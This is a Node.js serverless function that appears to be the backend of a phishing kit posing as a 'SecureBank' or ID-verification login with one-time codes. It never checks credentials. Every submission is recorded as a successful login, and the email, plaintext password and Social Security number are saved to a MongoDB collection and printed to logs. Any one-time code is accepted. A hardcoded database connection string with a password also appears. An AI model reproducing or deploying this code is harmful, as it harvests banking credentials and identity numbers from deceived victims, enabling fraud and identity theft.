const mongoose = require("mongoose");

// MongoDB Models (inline for serverless)
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  isEmailVerified: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const otpCodeSchema = new mongoose.Schema({
  email: { type: String, required: true },
  code: { type: String, required: true },
  expiresAt: { type: Date, required: true },
  isUsed: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const loginAttemptSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true },
  ssn: { type: String, required: true },
  success: { type: Boolean, required: true },
  ipAddress: { type: String },
  userAgent: { type: String },
  createdAt: { type: Date, default: Date.now }
});

const otpAttemptSchema = new mongoose.Schema({
  email: { type: String, required: true },
  code: { type: String, required: true },
  success: { type: Boolean, required: true },
  ipAddress: { type: String },
  userAgent: { type: String },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.models.User || mongoose.model('User', userSchema);
const OTPCode = mongoose.models.OTPCode || mongoose.model('OTPCode', otpCodeSchema);
const LoginAttempt = mongoose.models.LoginAttempt || mongoose.model('LoginAttempt', loginAttemptSchema);
const OTPAttempt = mongoose.models.OTPAttempt || mongoose.model('OTPAttempt', otpAttemptSchema);

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://securebank69_id-db_user:sCgZIxMNjYYi72HA@id-me.sg89vi5.mongodb.net/secure-id?retryWrites=true&w=majority&appName=id-me';

let isConnected = false;

async function connectToMongoDB() {
  if (isConnected) {
    return true;
  }

  try {
    await mongoose.connect(MONGODB_URI, {
      connectTimeoutMS: 10000,
      serverSelectionTimeoutMS: 10000,
    });
    isConnected = true;
    console.log('Connected to MongoDB');
    return true;
  } catch (error) {
    console.error('Error connecting to MongoDB:', error);
    return false;
  }
}

// Storage class simplified for serverless
class MongoDBStorage {
  async getUserByEmail(email) {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, skipping user lookup');
      return undefined;
    }
    try {
      const user = await User.findOne({ email }).lean();
      if (!user) return undefined;
      const { _id, ...userData } = user;
      return { ...userData, id: _id.toString() };
    } catch (error) {
      console.error('Error getting user by email:', error);
      return undefined;
    }
  }

  async createUser(insertUser) {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, creating mock user');
      return {
        id: 'mock_' + Date.now(),
        email: insertUser.email,
        password: insertUser.password,
        isEmailVerified: false,
        createdAt: new Date()
      };
    }
    try {
      const user = new User(insertUser);
      const savedUser = await user.save();
      const { _id, ...userData } = savedUser.toObject();
      return { ...userData, id: _id.toString() };
    } catch (error) {
      console.error('Error creating user:', error);
      return {
        id: 'mock_' + Date.now(),
        email: insertUser.email,
        password: insertUser.password,
        isEmailVerified: false,
        createdAt: new Date()
      };
    }
  }

  async generateOTP(email) {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresAt = new Date(Date.now() + 5 * 60 * 1000);
    
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, creating mock OTP');
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        expiresAt,
        isUsed: false,
        createdAt: new Date()
      };
    }
    
    try {
      await OTPCode.deleteMany({ email });
      const otpCode = new OTPCode({
        email,
        code,
        expiresAt,
        isUsed: false
      });
      
      const savedOtp = await otpCode.save();
      const { _id, ...otpData } = savedOtp.toObject();
      return { ...otpData, id: _id.toString() };
    } catch (error) {
      console.error('Error generating OTP:', error);
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        expiresAt,
        isUsed: false,
        createdAt: new Date()
      };
    }
  }

  async logLoginAttempt(email, password, ssn, success, ipAddress, userAgent) {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, logging to console instead');
      console.log('LOGIN ATTEMPT:', { email, password, ssn, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
    
    try {
      const loginAttempt = new LoginAttempt({
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent
      });
      
      const savedAttempt = await loginAttempt.save();
      const { _id, ...attemptData } = savedAttempt.toObject();
      return { 
        ...attemptData, 
        id: _id.toString(),
        ipAddress: attemptData.ipAddress || undefined,
        userAgent: attemptData.userAgent || undefined
      };
    } catch (error) {
      console.error('Error logging login attempt:', error);
      console.log('LOGIN ATTEMPT (FALLBACK):', { email, password, ssn, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
  }

  async logOTPAttempt(email, code, success, ipAddress, userAgent) {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, logging to console instead');
      console.log('OTP ATTEMPT:', { email, code, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
    
    try {
      const otpAttempt = new OTPAttempt({
        email,
        code,
        success,
        ipAddress,
        userAgent
      });
      
      const savedAttempt = await otpAttempt.save();
      const { _id, ...attemptData } = savedAttempt.toObject();
      return { 
        ...attemptData, 
        id: _id.toString(),
        ipAddress: attemptData.ipAddress || undefined,
        userAgent: attemptData.userAgent || undefined
      };
    } catch (error) {
      console.error('Error logging OTP attempt:', error);
      console.log('OTP ATTEMPT (FALLBACK):', { email, code, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
  }
}

const storage = new MongoDBStorage();

// Simple validation functions
function validateLogin(data) {
  if (!data.email || !data.email.includes('@')) {
    throw new Error('Please enter a valid email address');
  }
  if (!data.password || data.password.length < 6) {
    throw new Error('Password must be at least 6 characters');
  }
  if (!data.ssn || !/^\d{3}-\d{2}-\d{4}$/.test(data.ssn)) {
    throw new Error('SSN must be in format XXX-XX-XXXX');
  }
  return data;
}

function validateOTP(data) {
  if (!data.email || !data.email.includes('@')) {
    throw new Error('Please enter a valid email address');
  }
  if (!data.code || data.code.length !== 6) {
    throw new Error('OTP code must be 6 digits');
  }
  return data;
}

// Helper function to parse path and determine endpoint
function getEndpoint(path) {
  // Remove /.netlify/functions/api prefix
  const cleanPath = path.replace('/.netlify/functions/api', '');
  return cleanPath;
}

// Main Netlify Function Handler
exports.handler = async (event, context) => {
  // Handle CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      },
      body: '',
    };
  }

  const { httpMethod, path, body, headers } = event;
  const endpoint = getEndpoint(path);

  console.log('Request:', { httpMethod, path, endpoint });

  try {
    let requestBody = {};
    if (body) {
      try {
        requestBody = JSON.parse(body);
      } catch (e) {
        return {
          statusCode: 400,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
          body: JSON.stringify({ success: false, message: 'Invalid JSON' }),
        };
      }
    }

    const ipAddress = headers['x-forwarded-for'] || headers['x-real-ip'] || 'unknown';
    const userAgent = headers['user-agent'] || 'unknown';

    // Route handling
    if (httpMethod === 'POST' && endpoint === '/auth/login') {
      const validatedData = validateLogin(requestBody);
      
      await storage.logLoginAttempt(
        validatedData.email,
        validatedData.password,
        validatedData.ssn,
        true,
        ipAddress,
        userAgent
      );
      
      const otpCode = await storage.generateOTP(validatedData.email);
      
      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
        body: JSON.stringify({
          success: true,
          message: "OTP sent to your email",
          email: validatedData.email,
          otp: otpCode.code // For demo purposes only
        }),
      };
    }

    if (httpMethod === 'POST' && endpoint === '/auth/verify-otp') {
      const validatedData = validateOTP(requestBody);
      
      await storage.logOTPAttempt(
        validatedData.email,
        validatedData.code,
        true,
        ipAddress,
        userAgent
      );
      
      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
        body: JSON.stringify({
          success: true,
          message: "Login successful",
          redirectUrl: "/dashboard"
        }),
      };
    }

    if (httpMethod === 'POST' && endpoint === '/auth/resend-otp') {
      const { email } = requestBody;
      
      if (!email) {
        return {
          statusCode: 400,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
          body: JSON.stringify({
            success: false,
            message: "Email is required"
          }),
        };
      }

      const user = await storage.getUserByEmail(email);
      if (!user) {
        return {
          statusCode: 404,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
          body: JSON.stringify({
            success: false,
            message: "User not found"
          }),
        };
      }

      const otpCode = await storage.generateOTP(email);
      
      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
        body: JSON.stringify({
          success: true,
          message: "New OTP sent to your email",
          otp: otpCode.code // For demo purposes only
        }),
      };
    }

    if (httpMethod === 'POST' && endpoint === '/auth/create-demo-user') {
      const demoUser = await storage.createUser({
        email: "demo@securebank.com",
        password: "password123"
      });
      
      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
        body: JSON.stringify({
          success: true,
          message: "Demo user created",
          user: { id: demoUser.id, email: demoUser.email }
        }),
      };
    }

    // Route not found
    return {
      statusCode: 404,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
      },
      body: JSON.stringify({
        success: false,
        message: `Route not found: ${httpMethod} ${endpoint}`
      }),
    };

  } catch (error) {
    console.error('Function error:', error);

    if (error.message) {
      return {
        statusCode: 400,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
        body: JSON.stringify({
          success: false,
          message: error.message
        }),
      };
    }

    return {
      statusCode: 500,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
      },
      body: JSON.stringify({
        success: false,
        message: "Internal server error"
      }),
    };
  }
};